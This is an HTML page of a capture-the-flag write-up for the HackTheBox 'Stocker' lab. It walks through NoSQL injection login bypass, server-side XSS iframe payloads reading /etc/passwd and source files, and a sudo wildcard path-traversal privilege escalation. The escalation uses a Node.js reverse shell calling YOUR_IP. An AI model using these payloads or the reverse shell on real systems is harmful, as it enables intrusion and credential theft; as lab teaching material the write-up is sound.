@@ -1,0 +1,250 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>HackTheBox Stocker // 53CTF</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.108.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="5YC10P5" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.1b165e60871be07c93da04ef30238e50223c9da30f957d760f25b24143926af9.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HackTheBox Stocker"/>
+<meta name="twitter:description" content="Name: Stocker IP: 10.10.11.196 Defficulty: Easy OS: Linux Author: JoshSH Nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 3d12971d86bc161683608f4f06e6d54e (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/Jyuj3D7FuZQdudxWlH081Q6WkdTVz6G05mFSFpBpycfOrwuJpQ6oJV1I4J6UeXg&#43;o5xHSm&#43;ANLhYEI6T/JMnYSyEmVq/QVactDs9ixhi&#43;j0R0rUrYYgteX7XuOT2g4ivyp1zKQP1uKYF2lGVnrcvX4a6ds4FS8mkM2o74qeZj6XfUiCYdPSVJmFjX/TgTzXYHt7kHj0vLtMG63sxXQDVLC5NwLs3VE61qD4KmhCfu&#43;9viOBvA1ZID4Bmw8vgi0b5FfQASbtkylpRxdOEyUxGZ1dbcJzT&#43;wGEhalvlQl9CirZLPMBn4YMC86okK/Kc0Wv&#43;X/lC&#43;4UehL//U3MkD9XF3yTmq&#43;UVF/qJTrs9Y15lUOu3bJ9kpP9VDbA6NNGi1HdLyO4CbtifsWblmmoRWIr&#43;U8B2wP/D9whWGwRJPBBwTJWZvxvZz3llRQhq/8Np0374iHWIEG&#43;k9U9Am6rFKBgGlPUcf6Mg7w4AFLiFEQaQFRpEbf&#43;xtS1YMLLqpg3qB0= | 256 7c4d1a7868ce1200df491037f9ad174f (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNgPXCNqX65/kNxcEEVPqpV7du&#43;KsPJokAydK/wx1GqHpuUm3lLjMuLOnGFInSYGKlCK1MLtoCX6DjVwx6nWZ5w= | 256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIDyp1s8jG&#43;rEbfeqAQbCqJw5&#43;Y&#43;T17PRzOcYd&#43;W32hF 80/tcp open http syn-ack nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://stocker.htb | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Two ports are open."/>
+
+    <meta property="og:title" content="HackTheBox Stocker" />
+<meta property="og:description" content="Name: Stocker IP: 10.10.11.196 Defficulty: Easy OS: Linux Author: JoshSH Nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 3d12971d86bc161683608f4f06e6d54e (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/Jyuj3D7FuZQdudxWlH081Q6WkdTVz6G05mFSFpBpycfOrwuJpQ6oJV1I4J6UeXg&#43;o5xHSm&#43;ANLhYEI6T/JMnYSyEmVq/QVactDs9ixhi&#43;j0R0rUrYYgteX7XuOT2g4ivyp1zKQP1uKYF2lGVnrcvX4a6ds4FS8mkM2o74qeZj6XfUiCYdPSVJmFjX/TgTzXYHt7kHj0vLtMG63sxXQDVLC5NwLs3VE61qD4KmhCfu&#43;9viOBvA1ZID4Bmw8vgi0b5FfQASbtkylpRxdOEyUxGZ1dbcJzT&#43;wGEhalvlQl9CirZLPMBn4YMC86okK/Kc0Wv&#43;X/lC&#43;4UehL//U3MkD9XF3yTmq&#43;UVF/qJTrs9Y15lUOu3bJ9kpP9VDbA6NNGi1HdLyO4CbtifsWblmmoRWIr&#43;U8B2wP/D9whWGwRJPBBwTJWZvxvZz3llRQhq/8Np0374iHWIEG&#43;k9U9Am6rFKBgGlPUcf6Mg7w4AFLiFEQaQFRpEbf&#43;xtS1YMLLqpg3qB0= | 256 7c4d1a7868ce1200df491037f9ad174f (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNgPXCNqX65/kNxcEEVPqpV7du&#43;KsPJokAydK/wx1GqHpuUm3lLjMuLOnGFInSYGKlCK1MLtoCX6DjVwx6nWZ5w= | 256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIDyp1s8jG&#43;rEbfeqAQbCqJw5&#43;Y&#43;T17PRzOcYd&#43;W32hF 80/tcp open http syn-ack nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://stocker.htb | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Two ports are open." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://53ctf.github.io/posts/htb/stocker/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-01-15T09:16:32+05:30" />
+<meta property="article:modified_time" content="2023-01-15T09:16:32+05:30" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://53ctf.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="5YC10P5" /></a>
+      <span class="app-header-title">53CTF</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/hackthebox/">HTB</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/notes/">Notes</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">About</a>
+      </nav>
+      <p>This is where I keep my notes and also where I post articles, writeups, walkthroughs and stuff like that so everybody else can learn something out of it.....</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/53ctf" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://twitter.com/syclops101" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+          <a href="https://web.facebook.com/syclops101" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-facebook">
+  <title>HackTheBox</title>
+  <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HackTheBox Stocker</h1>
+      <div class="post-meta">
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jan 15, 2023
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          4 min read
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://53ctf.github.io/tags/hackthebox/">HackTheBox</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <ul>
+<li>Name: Stocker</li>
+<li>IP: 10.10.11.196</li>
+<li>Defficulty: Easy</li>
+<li>OS: Linux</li>
+<li>Author: <a href="https://www.hackthebox.com/home/users/profile/269501">JoshSH</a></li>
+</ul>
+<h2 id="nmap">Nmap</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT   STATE SERVICE REASON  VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 3d12971d86bc161683608f4f06e6d54e <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/Jyuj3D7FuZQdudxWlH081Q6WkdTVz6G05mFSFpBpycfOrwuJpQ6oJV1I4J6UeXg+o5xHSm+ANLhYEI6T/JMnYSyEmVq/QVactDs9ixhi+j0R0rUrYYgteX7XuOT2g4ivyp1zKQP1uKYF2lGVnrcvX4a6ds4FS8mkM2o74qeZj6XfUiCYdPSVJmFjX/TgTzXYHt7kHj0vLtMG63sxXQDVLC5NwLs3VE61qD4KmhCfu+9viOBvA1ZID4Bmw8vgi0b5FfQASbtkylpRxdOEyUxGZ1dbcJzT+wGEhalvlQl9CirZLPMBn4YMC86okK/Kc0Wv+X/lC+4UehL//U3MkD9XF3yTmq+UVF/qJTrs9Y15lUOu3bJ9kpP9VDbA6NNGi1HdLyO4CbtifsWblmmoRWIr+U8B2wP/D9whWGwRJPBBwTJWZvxvZz3llRQhq/8Np0374iHWIEG+k9U9Am6rFKBgGlPUcf6Mg7w4AFLiFEQaQFRpEbf+xtS1YMLLqpg3qB0<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 7c4d1a7868ce1200df491037f9ad174f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNgPXCNqX65/kNxcEEVPqpV7du+KsPJokAydK/wx1GqHpuUm3lLjMuLOnGFInSYGKlCK1MLtoCX6DjVwx6nWZ5w<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> dd978050a5bacd7d55e827ed28fdaa3b <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIDyp1s8jG+rEbfeqAQbCqJw5+Y+T17PRzOcYd+W32hF
+</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://stocker.htb
+</span></span><span style="display:flex;"><span>| http-methods:
+</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>Two ports are open.</p>
+<ul>
+<li><strong>22/TCP SSH</strong>
+<ul>
+<li>OpenSSH 8.2p1</li>
+<li>And its banner tells that it is a ubuntu machine</li>
+</ul>
+</li>
+<li><strong>80/TCP HTTP</strong>
+<ul>
+<li>nginx 1.18.0</li>
+<li>And its HTTP title says that <em>&ldquo;Did not follow redirect to <code>http://stocker.htb</code>&rdquo;</em>. So let&rsquo;s add <code>stocker.htb</code> into <code>/etc/hosts</code>.</li>
+</ul>
+</li>
+</ul>
+<h2 id="web-enumeration">Web Enumeration</h2>
+<h3 id="subdomain-fuzzing">Subdomain Fuzzing</h3>
+<p>Since we have that <code>stocker.htb</code> domain, we can look if there is any other subdomains available or not.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; ffuf -u http://10.10.11.196/ -H <span style="color:#e6db74">&#34;Host: FUZZ.stocker.htb&#34;</span> -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -c -fs <span style="color:#ae81ff">178</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dev                     <span style="color:#f92672">[</span>Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 249ms<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>And we got <code>dev</code> right away. So let&rsquo;s add that to <code>/etc/hosts</code> as well.</p>
+<h3 id="directory-fuzzing">Directory Fuzzing</h3>
+<p>I couldn&rsquo;t find any directories under <code>http://stocker.htb</code>. But under <code>http://dev.stocker.htb</code>, I found a one directory.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; dirsearch -u http://dev.stocker.htb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>09:31:06<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    3KB - /login/
+</span></span></code></pre></div><p>Although, if we visit the <code>http://dev.stocker.htb</code>, it will redirect us to <code>http://dev.stocker.htb/login</code> automatically.</p>
+<p><img src="images/login.png" alt="Dev Login"></p>
+<p>From <a href="https://www.wappalyzer.com/">Wappalyzer</a>, I found the site has been build using <a href="https://nodejs.org/en/">NodeJS</a>. So the first thing came into my mind was <em>&lsquo;There might be an <a href="https://www.mongodb.com/nosql-explained">NoSQL</a> injection in this login form&rsquo;</em>. So then I started to exploit the NoSQLi within the login page.</p>
+<p>Let&rsquo;s intercept the login request with <a href="https://portswigger.net/burp">BurpSuite</a>.</p>
+<p><img src="images/login_req.png" alt="Login Request"></p>
+<p>To bypass the authentication, we can use NoSQL bypass payloads from <a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass">HackTricks</a>.<br>
+And then bypass the login request.</p>
+<p><img src="images/nosql_payload.png" alt="NoSQL Payload"></p>
+<p>And make sure to change the <code>Content-Type</code> header to json as well.</p>
+<p>After that you will be redirected to <code>http://dev.stocker.htb/stock</code> page which seems like a online shopping store. This is a static site build using <a href="https://gohugo.io/">Hugo</a>.</p>
+<p>Basically in this site, we have few items to choose from and we can add them into the shopping cart. And then from the cart, we can checkout. After checkout, it will generate a order id for us and it give us a change to view the PO.</p>
+<p>After a little while, I noticed a <a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf#server-side-xss-dynamic-pdf">Server Side XSS</a> within the purchace process.</p>
+<p>First add any item into the shopping cart.<br>
+<img src="images/add_to_cart.png" alt="Add to the cart"></p>
+<p>Then within the cart, checkout for the items that you&rsquo;ve added to the cart and intercept the request from <code>BurpSuite</code>.<br>
+<img src="images/checkout.png" alt="Checkout"></p>
+<p>And then add the payload to the <code>title</code> parameter like below.
+<img src="images/exploit_test.png" alt="test"></p>
+<p>As you can see, it worked!!!!
+<img src="images/exploit_test_confirmed.png" alt="test_confirmed"></p>
+<h2 id="foothold-angoose">Foothold [angoose]</h2>
+<p>Now let&rsquo;s get into the real stuff. Let&rsquo;s read the <code>/etc/passwd</code>. To do that I&rsquo;m going to use <code>iFrame</code>.
+Remeber to increse the size of the <code>iframe</code> to view all the content of the <code>/etc/passwd</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">file:///etc/passwd</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;700&#39;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1000&#39;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+</span></span></code></pre></div><p>And we got the <code>/etc/passwd</code>. And we only have one user names <code>angoose</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
+</span></span></code></pre></div><p>After a while I found the <code>index.js</code>. Within it I found database credentials.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span># payload
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">file:///var/www/dev/index.js</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;800&#39;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;800&#39;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// TODO: Configure loading from dotenv for production
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">dbURI</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;mongodb://dev:IHe**************************ure@localhost/dev?authSource=admin&amp;w=1&#34;</span>;
+</span></span></code></pre></div><p>Let&rsquo;s try to login to the box via <code>SSH</code> with the user <code>angoose</code> and the password that we just descovered.
+It worked and we are now in the box.</p>
+<p>Get the user flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>angoose@stocker:~$ cat user.txt
+</span></span><span style="display:flex;"><span>308**************************aa0
+</span></span></code></pre></div><h2 id="privesc-root">Privesc [Root]</h2>
+<p>If we ran <code>sudo -l</code> we can see that <code>every</code> user can run <code>every</code> script within the <code>/usr/local/scripts/</code> direcroty as the <code>root</code> user.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>angoose@stocker:~$ sudo -l
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> angoose:
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> angoose on stocker:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User angoose may run the following commands on stocker:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> /usr/bin/node /usr/local/scripts/*.js
+</span></span></code></pre></div><p>The vulnerablity in here is that the <code>*</code>. We can replace anything with that asterisk and <code>node</code> will try to run it&hellip;lol&hellip;</p>
+<p>Let&rsquo;s create a script to get a reverse shell as the user <code>root</code>.
+<strong>rev.js</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/node
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>(<span style="color:#66d9ef">function</span>(){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">net</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;net&#34;</span>),
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">cp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>),
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sh</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">cp</span>.<span style="color:#a6e22e">spawn</span>(<span style="color:#e6db74">&#34;bash&#34;</span>, []);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">client</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Socket</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">YOUR_PORT</span>, <span style="color:#e6db74">&#34;YOUR_IP&#34;</span>, <span style="color:#66d9ef">function</span>(){
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">pipe</span>(<span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">stdin</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">stdout</span>.<span style="color:#a6e22e">pipe</span>(<span style="color:#a6e22e">client</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">stderr</span>.<span style="color:#a6e22e">pipe</span>(<span style="color:#a6e22e">client</span>);
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">/a/</span>;
+</span></span><span style="display:flex;"><span>})();
+</span></span></code></pre></div><p>Then start a listener and run the script like below.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>angoose@stocker:~$ realpath rev.js
+</span></span><span style="display:flex;"><span>/home/angoose/rev.js
+</span></span><span style="display:flex;"><span>angoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../../../home/angoose/rev.js
+</span></span></code></pre></div><p>Got the revese shell as the <code>root</code> user. Get the root flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@stocker:~# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>root@stocker:~# id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>root@stocker:~# cat root.txt
+</span></span><span style="display:flex;"><span>fff**************************449
+</span></span></code></pre></div><h2 id="root-uninteded">Root [Uninteded]</h2>
+<p>After you logged into the box as the user <code>angoose</code>, create a soft link to the <code>/root/root.txt</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ln -s /root/root.txt rootflag.js
+</span></span></code></pre></div><p>Then run it and get the root flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>angoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../../home/angoose/rootflag.js
+</span></span><span style="display:flex;"><span>/root/root.txt:1
+</span></span><span style="display:flex;"><span>fff**************************449
+</span></span><span style="display:flex;"><span>^
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ReferenceError: fff**************************449 is not defined
+</span></span><span style="display:flex;"><span>    at Object.&lt;anonymous&gt; <span style="color:#f92672">(</span>/root/root.txt:1:1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    at Module._compile <span style="color:#f92672">(</span>node:internal/modules/cjs/loader:1159:14<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    at Module._extensions..js <span style="color:#f92672">(</span>node:internal/modules/cjs/loader:1213:10<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    at Module.load <span style="color:#f92672">(</span>node:internal/modules/cjs/loader:1037:32<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    at Module._load <span style="color:#f92672">(</span>node:internal/modules/cjs/loader:878:12<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    at Function.executeUserEntryPoint <span style="color:#f92672">[</span>as runMain<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>node:internal/modules/run_main:81:12<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    at node:internal/main/run_main_module:23:47
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Node.js v18.12.1
+</span></span></code></pre></div>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
